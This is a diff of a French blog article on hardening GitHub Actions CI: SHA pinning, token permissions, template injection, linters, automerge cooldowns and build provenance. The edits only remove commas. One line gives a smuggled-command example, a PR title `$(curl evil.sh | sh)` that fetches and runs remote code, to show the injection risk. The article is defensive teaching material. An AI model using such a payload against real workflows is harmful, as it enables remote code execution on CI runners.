@@ -10,7 +10,7 @@ tags:
 
 # Durcir une CI GitHub Actions : pins, permissions, injections
 
-Une CI lit le repo, détient des secrets, publie des artefacts, et exécute du code que d'autres ont écrit. C'est la définition d'une cible. Tout ce qui suit tourne sur 2 repos publics, [gopen](https://github.com/PixiBixi/gopen) en Go et [uno-multiplayer](https://github.com/PixiBixi/uno-multiplayer) en Node, et ne dépend d'aucun des deux langages.
+Une CI lit le repo, détient des secrets, publie des artefacts et exécute du code que d'autres ont écrit. C'est la définition d'une cible. Tout ce qui suit tourne sur 2 repos publics, [gopen](https://github.com/PixiBixi/gopen) en Go et [uno-multiplayer](https://github.com/PixiBixi/uno-multiplayer) en Node et ne dépend d'aucun des deux langages.
 
 ## Épingler les actions par SHA, pas par tag
 
@@ -35,13 +35,13 @@ Ce qui se rate, c'est le pinning initial : on ajoute une action en `@v4` dans un
 }
 ```
 
-Dependabot n'a pas d'équivalent, et c'est une différence qui compte : il met à jour un SHA déjà écrit, mais il n'en pose jamais. Une action ajoutée en `@v4` y reste indéfiniment. C'est exactement comme ça que `uno-multiplayer` s'est retrouvé avec 12 actions non épinglées sans que personne l'ait décidé, alors que les 2 repos Go voisins étaient pinnés depuis leur premier commit.
+Dependabot n'a pas d'équivalent et c'est une différence qui compte : il met à jour un SHA déjà écrit, mais il n'en pose jamais. Une action ajoutée en `@v4` y reste indéfiniment. C'est exactement comme ça que `uno-multiplayer` s'est retrouvé avec 12 actions non épinglées sans que personne l'ait décidé, alors que les 2 repos Go voisins étaient pinnés depuis leur premier commit.
 
 Le pinning a par contre une limite qu'il vaut mieux connaître : il ne couvre que le premier niveau. Si `actions/checkout` référence lui-même une autre action par tag dans son `action.yml`, la résolution se fait au runtime et le SHA qu'on a écrit n'y change rien, donc quelqu'un qui compromet l'action imbriquée arrive quand même jusqu'au runner. GitHub a annoncé dans sa [roadmap sécurité Actions 2026](https://github.blog/news-insights/product-news/whats-coming-to-our-github-actions-2026-security-roadmap/) un bloc `dependencies:` dans le YAML du workflow, qui lockerait les dépendances directes **et** transitives par SHA avec vérification du hash avant exécution, dans l'esprit d'un `go.mod` + `go.sum`. En attendant, la seule vraie parade est de limiter le nombre d'actions tierces qu'on tire.
 
 ## Permissions au moindre privilège
 
-Le `GITHUB_TOKEN` par défaut est trop permissif. On le réduit au strict nécessaire, par workflow, et on descend au niveau du job quand un seul job a besoin d'un droit en écriture.
+Le `GITHUB_TOKEN` par défaut est trop permissif. On le réduit au strict nécessaire, par workflow et on descend au niveau du job quand un seul job a besoin d'un droit en écriture.
 
 ```yaml
 # Aucun droit : le workflow zizmor n'écrit rien au niveau global...
@@ -78,7 +78,7 @@ La seule exception légitime, c'est un job qui pousse vraiment quelque chose dep
 
 ## Épingler aussi le runner
 
-`ubuntu-latest` est un tag mutable de plus, simplement pas hébergé sur GitHub Marketplace. GitHub le fait glisser d'une image à la suivante avec quelques semaines de préavis, et le jour du basculement la CI change de version de bash, de Docker et de toolchains préinstallées sans qu'aucun commit ne le raconte.
+`ubuntu-latest` est un tag mutable de plus, simplement pas hébergé sur GitHub Marketplace. GitHub le fait glisser d'une image à la suivante avec quelques semaines de préavis et le jour du basculement la CI change de version de bash, de Docker et de toolchains préinstallées sans qu'aucun commit ne le raconte.
 
 ```yaml
 # Le contenu change sous nos pieds
@@ -88,7 +88,7 @@ runs-on: ubuntu-latest
 runs-on: ubuntu-24.04
 ```
 
-On nomme la version que `-latest` désigne aujourd'hui, pas la plus récente qui existe : `ubuntu-26.04` est disponible mais en preview, alors que `ubuntu-latest` reste sur 24.04. Côté macOS c'est l'inverse du réflexe, `macos-latest` pointe déjà sur macOS 26, donc écrire `macos-15` downgraderait le runner sans le dire. Renovate suit ces labels via sa datasource `github-runners`, alimentée par le manager `github-actions` qui lit les workflows, donc le pin ne fige rien : il transforme juste une migration subie en PR qu'on relit. La nuance compte dans une `packageRule` : `github-runners` dans `matchManagers` ne matche rien, et Renovate 44 l'accepte sans broncher, voir [valider une config Renovate](renovate-config.md).
+On nomme la version que `-latest` désigne aujourd'hui, pas la plus récente qui existe : `ubuntu-26.04` est disponible mais en preview, alors que `ubuntu-latest` reste sur 24.04. Côté macOS c'est l'inverse du réflexe, `macos-latest` pointe déjà sur macOS 26, donc écrire `macos-15` downgraderait le runner sans le dire. Renovate suit ces labels via sa datasource `github-runners`, alimentée par le manager `github-actions` qui lit les workflows, donc le pin ne fige rien : il transforme juste une migration subie en PR qu'on relit. La nuance compte dans une `packageRule` : `github-runners` dans `matchManagers` ne matche rien et Renovate 44 l'accepte sans broncher, voir [valider une config Renovate](renovate-config.md).
 
 ## Injection de template : le `${{ }}` passe avant bash
 
@@ -104,7 +104,7 @@ C'est la vuln la plus facile à introduire et la plus dure à voir en relecture.
   run: echo "PR: $TITLE"
 ```
 
-Une PR titrée `$(curl evil.sh | sh)` s'exécute donc dans le premier cas, et bash n'a aucun moyen de savoir d'où vient la valeur. En passant par `env:`, le contenu reste une chaîne, quoi qu'il y ait dedans.
+Une PR titrée `$(curl evil.sh | sh)` s'exécute donc dans le premier cas et bash n'a aucun moyen de savoir d'où vient la valeur. En passant par `env:`, le contenu reste une chaîne, quoi qu'il y ait dedans.
 
 Ce qui est contrôlé de l'extérieur est plus large qu'on ne croit : titre et corps de PR, nom de branche, message de commit, label, nom d'auteur. Et les `inputs` d'un `workflow_dispatch`, qui sont du texte libre tapé dans un formulaire - c'est le cas qu'on trouve dans `uno-multiplayer`, où le tag à republier partait directement dans un `echo` :
 
@@ -155,7 +155,7 @@ Quand un finding est un faux positif dans son contexte, on l'annote plutôt que 
 - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1 # zizmor: ignore[artipacked]
 ```
 
-zizmor a un angle mort symétrique : il lit le workflow, pas le shell qu'il contient. [actionlint](https://github.com/rhysd/actionlint) complète en passant chaque bloc `run:` à shellcheck, et en validant au passage les labels de runner, les `needs:` qui pointent vers un job inexistant et les expressions `${{ }}` mal typées. Son premier passage sur `gopen` a sorti un `goimports -w $(find . -name '*.go')` qui se casse au premier fichier contenant une espace, invisible depuis 6 mois parce que le repo n'a pas de fichier qui déclenche le cas.
+zizmor a un angle mort symétrique : il lit le workflow, pas le shell qu'il contient. [actionlint](https://github.com/rhysd/actionlint) complète en passant chaque bloc `run:` à shellcheck et en validant au passage les labels de runner, les `needs:` qui pointent vers un job inexistant et les expressions `${{ }}` mal typées. Son premier passage sur `gopen` a sorti un `goimports -w $(find . -name '*.go')` qui se casse au premier fichier contenant une espace, invisible depuis 6 mois parce que le repo n'a pas de fichier qui déclenche le cas.
 
 ## Automerger sans avaler une release compromise
 
@@ -182,11 +182,11 @@ Reste un trou que la CI verte ne bouche pas : automerger une version publiée il
 
 5 jours couvre à peu près la fenêtre pendant laquelle une release compromise se fait repérer. Le prix apparent, c'est un retard de 5 jours sur les patchs de sécurité, sauf que Renovate neutralise le cooldown dans sa config `vulnerabilityAlerts` (`minimumReleaseAge: null` par défaut) : les updates qui répondent à une CVE connue passent toujours tout de suite.
 
-`digest` est le type qu'on oublie, et c'est le plus intéressant des quatre. Un update `digest` seul veut dire que la version n'a pas bougé mais que le SHA derrière le tag, si, donc que quelqu'un a redéplacé `v7` sur un autre commit. C'est précisément le scénario contre lequel on épingle, et c'est aussi le type le plus automergé. Il a plus besoin du cooldown que les autres.
+`digest` est le type qu'on oublie et c'est le plus intéressant des quatre. Un update `digest` seul veut dire que la version n'a pas bougé mais que le SHA derrière le tag, si, donc que quelqu'un a redéplacé `v7` sur un autre commit. C'est précisément le scénario contre lequel on épingle et c'est aussi le type le plus automergé. Il a plus besoin du cooldown que les autres.
 
 Les deux règles ne se recouvrent pas : celle-ci ne pose que `minimumReleaseAge`, l'automerge reste défini par la règle précédente. Renovate applique les settings de chaque règle indépendamment, sans héritage de l'une vers l'autre, donc un `major` récupère le cooldown et rien d'autre - il attend toujours une revue.
 
-Sur Dependabot, le même réglage se pose par écosystème, et il existe déjà par défaut à 3 jours :
+Sur Dependabot, le même réglage se pose par écosystème et il existe déjà par défaut à 3 jours :
 
 ```yaml title=".github/dependabot.yml"
 updates:
@@ -206,7 +206,7 @@ Le cran d'après, c'est de réserver l'automerge à une allow-list d'orgs de con
 
 3 couches en plus, chacune à un fichier de workflow près.
 
-- **[dependency-review-action](https://github.com/actions/dependency-review-action)** compare le graphe de dépendances avant et après la PR, et bloque le merge si une CVE connue ou une licence non voulue **entre** dans l'arbre. Un scanner comme govulncheck dit si on appelle vraiment la fonction vulnérable ; dependency-review dit qu'elle arrive, ce qui est le bon moment pour discuter d'une dépendance qu'on n'a pas encore.
+- **[dependency-review-action](https://github.com/actions/dependency-review-action)** compare le graphe de dépendances avant et après la PR et bloque le merge si une CVE connue ou une licence non voulue **entre** dans l'arbre. Un scanner comme govulncheck dit si on appelle vraiment la fonction vulnérable ; dependency-review dit qu'elle arrive, ce qui est le bon moment pour discuter d'une dépendance qu'on n'a pas encore.
 
     ```yaml
     - uses: actions/dependency-review-action@a1d282b36b6f3519aa1f3fc636f609c47dddb294 # v5.0.0
@@ -214,13 +214,13 @@ Le cran d'après, c'est de réserver l'automerge à une allow-list d'orgs de con
 
 - **[OpenSSF Scorecard](https://securityscorecards.dev/)** note le repo sur une vingtaine de checks et publie le résultat dans l'onglet Security. Son intérêt est de regarder ce qui n'est pas dans les workflows : protection de branche, présence d'une politique de sécurité, signature des releases, activité de maintenance. Un audit qui tourne tout seul plutôt qu'une relecture annuelle.
 
-- **[harden-runner](https://github.com/step-security/harden-runner)** filtre le trafic sortant du runner. On le pose d'abord en `audit` pour voir ce que la CI contacte réellement, puis en `block` avec une allow-list. C'est ce mécanisme qui a permis de repérer la compromission de `tj-actions/changed-files` en 2025 : les runners exfiltraient vers un endpoint qui n'avait rien à faire là, et l'anomalie est sortie dans les rapports d'egress avant que qui que ce soit lise le diff de l'action.
+- **[harden-runner](https://github.com/step-security/harden-runner)** filtre le trafic sortant du runner. On le pose d'abord en `audit` pour voir ce que la CI contacte réellement, puis en `block` avec une allow-list. C'est ce mécanisme qui a permis de repérer la compromission de `tj-actions/changed-files` en 2025 : les runners exfiltraient vers un endpoint qui n'avait rien à faire là et l'anomalie est sortie dans les rapports d'egress avant que qui que ce soit lise le diff de l'action.
 
 GitHub prépare son propre pare-feu d'egress natif, décrit dans la roadmap 2026, qui tournerait hors de la VM du runner et resterait donc actif même si un attaquant y obtient root.
 
 ## Attester comment l'artefact a été construit
 
-Une signature dit **qui** a publié. Elle ne dit pas depuis quel repo, quel commit, ni quel workflow, et c'est précisément ce qu'un attaquant qui obtient un job de release voudrait maquiller. La provenance SLSA enregistre tout ça dans une attestation signée par l'OIDC GitHub, donc un job compromis ne peut pas en produire une qui prétende venir d'un autre workflow.
+Une signature dit **qui** a publié. Elle ne dit pas depuis quel repo, quel commit, ni quel workflow et c'est précisément ce qu'un attaquant qui obtient un job de release voudrait maquiller. La provenance SLSA enregistre tout ça dans une attestation signée par l'OIDC GitHub, donc un job compromis ne peut pas en produire une qui prétende venir d'un autre workflow.
 
 Ça tient en un step et 2 permissions, quel que soit ce qu'on publie :
 
@@ -234,7 +234,7 @@ permissions:
           subject-path: 'dist/*.tar.gz,dist/checksums.txt'
 ```
 
-Pour une image OCI, la provenance s'attache au digest et pas à un fichier, et `push-to-registry` la publie à côté du manifest pour qu'un consommateur la trouve sans passer par la release GitHub :
+Pour une image OCI, la provenance s'attache au digest et pas à un fichier et `push-to-registry` la publie à côté du manifest pour qu'un consommateur la trouve sans passer par la release GitHub :
 
 ```yaml
       - uses: docker/build-push-action@53b7df96c91f9c12dcc8a07bcb9ccacbed38856a # v7.3.0
@@ -248,7 +248,7 @@ Pour une image OCI, la provenance s'attache au digest et pas à un fichier, et `
           push-to-registry: true
 ```
 
-Le piège du `subject-name` : il doit être en minuscules. `metadata-action` minuscule le nom de l'image toute seule pour ses tags, l'attestation non, et GHCR refuse les majuscules - donc un repo dont l'owner a une capitale casse ici et nulle part ailleurs.
+Le piège du `subject-name` : il doit être en minuscules. `metadata-action` minuscule le nom de l'image toute seule pour ses tags, l'attestation non et GHCR refuse les majuscules - donc un repo dont l'owner a une capitale casse ici et nulle part ailleurs.
 
 La vérification côté utilisateur tient en une commande, sans avoir à connaître l'identité du certificat comme pour `cosign verify` :
 
@@ -259,7 +259,7 @@ gh attestation verify oci://ghcr.io/monorg/mon-image:vX.Y.Z --repo monorg/mon-re
 
 ## Rendre les releases immuables
 
-Une fois la release publiée, GitHub sait interdire de redéplacer son tag et de remplacer ses assets : c'est le toggle *Immutable releases* dans les settings du repo. Une case à cocher, et elle ferme le scénario où un compte compromis republie un binaire sous un tag déjà installé partout.
+Une fois la release publiée, GitHub sait interdire de redéplacer son tag et de remplacer ses assets : c'est le toggle *Immutable releases* dans les settings du repo. Une case à cocher et elle ferme le scénario où un compte compromis republie un binaire sous un tag déjà installé partout.
 
 Le pendant côté artefacts, c'est la signature : la provenance dit d'où vient le binaire, cosign dit qui l'a publié. Sa configuration dans un pipeline GoReleaser est dans [l'article dédié](goreleaser.md).
 
@@ -269,7 +269,7 @@ Le pendant côté artefacts, c'est la signature : la provenance dit d'où vient 
 - `pinDigests` pour que la prochaine action ajoutée le soit aussi
 - `permissions:` au moindre privilège, `{}` au global et opt-in par job
 - `persist-credentials: false` sur chaque checkout, sauf celui qui pousse vraiment
-- Runners nommés, et tout outil installé dans un `run:` en version épinglée
+- Runners nommés et tout outil installé dans un `run:` en version épinglée
 - Aucun `${{ }}` dans un bloc `run:`, tout passe par `env:`
 - zizmor et actionlint en CI pour que ça reste vrai
 - Automerge derrière un cooldown de 5 jours, `digest` compris
